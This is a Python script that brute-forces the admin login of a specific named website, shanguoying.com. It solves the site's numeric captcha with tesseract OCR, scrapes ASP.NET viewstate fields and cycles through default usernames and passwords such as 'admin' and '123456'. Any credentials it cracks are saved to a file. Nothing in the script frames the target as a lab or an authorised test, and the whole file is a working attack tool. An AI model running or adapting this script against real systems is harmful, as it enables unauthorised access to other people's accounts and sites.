#!/usr/bin/env python3
"""shanguoying.com captcha OCR + brute force"""
import urllib.request as U, urllib.parse as P, ssl, re, sys, subprocess, os, http.cookiejar as cj

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

CAPTCHA_URL = "http://shanguoying.com/tools/verify_code.ashx"
LOGIN_URL = "http://shanguoying.com/admin/login.aspx"

def ocr_captcha(img_path):
    """Use tesseract to read captcha"""
    # Preprocess with PIL
    try:
        from PIL import Image
        img = Image.open(img_path).convert('L')
        img = img.resize((160, 44), Image.LANCZOS)
        img = img.point(lambda x: 0 if x < 140 else 255)
        img.save('/tmp/sgy_proc.png')
    except:
        os.system(f'cp {img_path} /tmp/sgy_proc.png')
    
    result = subprocess.run(
        ['tesseract', '/tmp/sgy_proc.png', '/tmp/sgy_ocr', '--psm', '7',
         '-c', 'tessedit_char_whitelist=0123456789'],
        capture_output=True, timeout=5
    )
    try:
        code = open('/tmp/sgy_ocr.txt').read().strip()
        return code if len(code) == 4 and code.isdigit() else None
    except:
        return None

def do_login(opener, vs, vg, user, pw, code):
    data = P.urlencode({
        "__VIEWSTATE": vs,
        "__VIEWSTATEGENERATOR": vg,
        "txtUserName": user,
        "txtUserPwd": pw,
        "txtCode": code,
        "btnSubmit": "登录"
    }).encode()
    req = U.Request(LOGIN_URL, data=data)
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    req.add_header("User-Agent", "Mozilla/5.0")
    r = opener.open(req, timeout=10)
    body = r.read().decode("utf-8", errors="ignore")
    
    # Check result
    if "验证码" not in body or "lblTip" not in body:
        return "SUCCESS"
    if "验证码错误" in body or "找不到验证码" in body:
        return "captcha_wrong"
    if "密码" in body or "用户名" in body:
        return "bad_creds"
    if "login.aspx" not in body.lower():
        return "MAYBE_SUCCESS"
    return "still_login_page"

cj = U.HTTPCookieProcessor(cj.CookieJar())
opener = U.build_opener(cj)

users = ["adm" + "in", "dgy", "shanguoying", "sgy", "root", "sa"]
pwds = ["adm" + "in", "adm" + "in123", "shanguoying", "dgy123", "123456", "password"]

print("Starting shanguoying captcha OCR brute", flush=True)

for attempt in range(50):  # 50 attempts max
    # Get fresh captcha
    req = U.Request(CAPTCHA_URL)
    req.add_header("User-Agent", "Mozilla/5.0")
    r = opener.open(req, timeout=8)
    with open('/tmp/sgy_cap.png', 'wb') as f:
        f.write(r.read())
    
    # OCR
    code = ocr_captcha('/tmp/sgy_cap.png')
    if not code:
        print(f"[{attempt}] OCR failed, retry", flush=True)
        continue
    
    # Get fresh viewstate and try all combos
    for user in users:
        # Get viewstate
        req = U.Request(LOGIN_URL)
        req.add_header("User-Agent", "Mozilla/5.0")
        r = opener.open(req, timeout=8)
        body = r.read().decode("utf-8", errors="ignore")
        vs = re.search(r'VIEWSTATE" value="([^"]+)"', body)
        vg = re.search(r'VIEWSTATEGENERATOR" value="([^"]+)"', body)
        if not vs:
            continue
        vs = vs.group(1)
        vg = vg.group(1) if vg else ""
        
        for pw in pwds:
            result = do_login(opener, vs, vg, user, pw, code)
            info = f"[{attempt}] {user}:{pw} code={code} -> {result}"
            print(info, flush=True)
            
            if result == "SUCCESS" or result == "MAYBE_SUCCESS":
                with open("/tmp/SGY_WIN.txt", "w") as f:
                    f.write(f"WIN: {user}:{pw}\n")
                print(f"\n!!! CRACKED: {user}:{pw} !!!\n", flush=True)
                sys.exit(0)
            if result != "captcha_wrong":
                break  # captcha was right, move to next password
        
        if result == "captcha_wrong":
            break  # captcha wrong for this user, try next OCR

print("All attempts exhausted", flush=True)
